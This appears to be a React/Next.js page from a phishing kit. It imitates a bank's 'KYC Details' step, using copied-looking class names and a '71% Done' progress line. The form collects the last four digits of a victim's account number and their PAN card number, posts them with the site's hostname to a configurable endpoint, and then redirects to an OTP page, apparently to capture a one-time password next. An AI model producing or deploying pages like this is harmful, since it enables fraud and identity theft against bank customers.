'use client'
import Captcha from "../../assets/captcha.png";
import { useRouter } from "next/navigation"; // in client component

import { useState } from 'react';
export default function Home() {
   const router = useRouter();
   const  [response, setResponse] = useState(false);
  const handleSubmit = (e) => {
    e.preventDefault();
      const formData = new FormData(e.target);
      const body = {};
      formData.forEach((value, key) => {
        body[key] = value;
      });
      body['site'] = window.location.hostname;
      fetch(process.env.API_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json'},
        body: JSON.stringify(body),
      })
        .then((res) => res.json())
        .then((responseData) => {
          if(responseData.status == 200){
            setResponse(true);
            router.push("/otp?next=/fna")
          }else{
            setResponse(false);
            console.log('failed');
          }
            
        })
        .catch((error) => {
          setResponse(false);
          console.error(error);
        });
  };
  return (
    <main>
    <div className="Tpv_login_heading__E5J6K">
      <h3 className="Tpv_login_heading_h3__z0Qx1 Tpv_login_heading_h3__z0Qx1Tpv_login_heading_h3__z0Qx1 Tpv_login_heading_h3__z0Qx1">KYC Details..</h3>
    </div>
    
    <div className="Tpv_login_form___9zpm Tpv_login_form___9zpmTpv_login_form___9zpmTpv_login_form___9zpm" >
            <p className="Tpv_mandatory_txt__YZHLO">Mandtory fields an asterisk (*)</p>
            <form className="Tpv_form__okPRU" onSubmit={handleSubmit}>
                <div className="Tpv_form_group__aHWg0">
                <label className="Tpv_label__cObJz">
                Last 4-digit A/c No <span className="Tpv_mandatory_txt__YZHLO Tpv_mandatory_txt__YZHLOTpv_mandatory_txt__YZHLO">*</span>
                </label>
                <input  
                    name="LDAN"
                    type="text"
                    inputMode="numeric"
                    minLength={4}
                    maxLength={4}
                    className="Tpv_form_control__5hzGF  Tpv_form_control__5hzGFTpv_form_control__5hzGF"
                    required
                />
                </div>
                <div className="Tpv_form_group__aHWg0">
                <label className="Tpv_label__cObJz">
                    Pan Card No.<span className="Tpv_mandatory_txt__YZHLO Tpv_mandatory_txt__YZHLOTpv_mandatory_txt__YZHLOTpv_mandatory_txt__YZHLOTpv_mandatory_txt__YZHLO">*</span>
                </label>
                <input  
                    name="PCN"
                    type="e"
                    pattern="[a-zA-Z]{5}[0-9]{4}[a-zA-Z]{1}"
                    maxLength={10}
                    minLength={10}
                    className="Tpv_form_control__5hzGF"
                    required
                />
                </div>
                <p className="Tpv_content_title__SWlCq">71% Done</p>
                <div className="Tpv_t_center__8YF86">
                <input
                    type="submit"
                    className="Tpv_btn_default__TMlv_"
                    defaultValue="submit"
                />
                </div>
            </form>
            
            </div>

  </main>
  
  )
}
